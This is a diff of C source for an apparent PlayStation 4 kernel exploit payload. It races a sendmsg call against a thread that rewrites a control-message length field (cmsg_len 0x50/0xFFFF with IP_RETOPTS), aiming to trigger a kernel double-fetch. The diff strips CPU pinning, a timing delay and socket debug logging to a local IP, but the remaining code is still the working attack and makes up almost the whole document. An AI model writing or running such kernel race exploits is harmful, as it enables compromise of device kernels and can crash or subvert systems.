@@ -123,14 +123,8 @@ int _main(struct thread *td) {
 */
 
 
-#include "ps4.h"
-
-typedef struct {
-    uint64_t bits[16];
-} cpuset_t;
-
-#define _CPU_SET(cpu, cpusetp) ((cpusetp)->bits[(cpu) / 64] |= (1ULL << ((cpu) % 64)))
-#define _CPU_ZERO(cpusetp) memset((cpusetp), 0, sizeof(cpuset_t))
+#include <ps4.h>
+#include "Network.h"
 
 struct msghdr {
     void         *msg_name;
@@ -149,29 +143,14 @@ struct cmsghdr {
 };
 
 #define IP_RETOPTS 7
-#define ITERATIONS 1000000
+#define ITERATIONS 200000
 #define CONTROL_LEN 256
-#define DEBUG_IP "192.168.100.16"
-#define DEBUG_PORT 9023
 
 struct cmsghdr *cmsg;
 uint8_t control_buf[CONTROL_LEN];
 int global_sock;
-int debug_sock;
-
-void debug_print(const char *msg) {
-    if (debug_sock > 0 && msg) {
-        SckSend(debug_sock, (char *)msg, strlen(msg));
-    }
-}
 
 void *sendmsg_thread(void *arg) {
-    UNUSED(arg);
-    cpuset_t cpuset;
-    _CPU_ZERO(&cpuset);
-    _CPU_SET(0, &cpuset);
-    syscall(597, scePthreadSelf(), sizeof(cpuset), &cpuset);
-
     struct msghdr msg;
     memset(&msg, 0, sizeof(msg));
     msg.msg_control = control_buf;
@@ -184,47 +163,27 @@ void *sendmsg_thread(void *arg) {
 }
 
 void *race_thread(void *arg) {
-    UNUSED(arg);
-    cpuset_t cpuset;
-    _CPU_ZERO(&cpuset);
-    _CPU_SET(1, &cpuset);
-    syscall(597, scePthreadSelf(), sizeof(cpuset), &cpuset);
-
-    if (!cmsg) return NULL;
-
     for (int i = 0; i < ITERATIONS; i++) {
         cmsg->cmsg_len = 0x50;
-        // حلقة التأخير لضبط توقيت السباق لمنع خطأ copyin المباشر
-        for(volatile int delay = 0; delay < 25; delay++); 
         cmsg->cmsg_len = 0xFFFF;
     }
     return NULL;
 }
 
 int _main(struct thread *td) {
-    UNUSED(td);
     initKernel();
     initLibc();
     initNetwork();
-    initPthread();
-
-    debug_sock = SckConnect(DEBUG_IP, DEBUG_PORT);
-    debug_print("[+] Connected! Starting Targeted Race...\n");
 
     global_sock = syscall(97, 2, 2, 0);
-    if (global_sock < 0) {
-        debug_print("[-] Socket failed\n");
-        return -1;
-    }
+    if (global_sock < 0) return -1;
 
     memset(control_buf, 0, CONTROL_LEN);
     cmsg = (struct cmsghdr *)control_buf;
-    cmsg->cmsg_level = 0;
+    cmsg->cmsg_level = 0; 
     cmsg->cmsg_type = IP_RETOPTS;
     cmsg->cmsg_len = 0x50;
 
-    debug_print("[+] Starting Threads...\n");
-    
     ScePthread thread1, thread2;
     scePthreadCreate(&thread1, NULL, sendmsg_thread, NULL, "thr_sendmsg");
     scePthreadCreate(&thread2, NULL, race_thread, NULL, "thr_race");
@@ -232,9 +191,5 @@ int _main(struct thread *td) {
     scePthreadJoin(thread1, NULL);
     scePthreadJoin(thread2, NULL);
 
-    debug_print("[+] Race Completed. If no Panic, adjust delay.\n");
-
-    if (debug_sock > 0) 
-SckClose(debug_sock);
     return 0;
 }
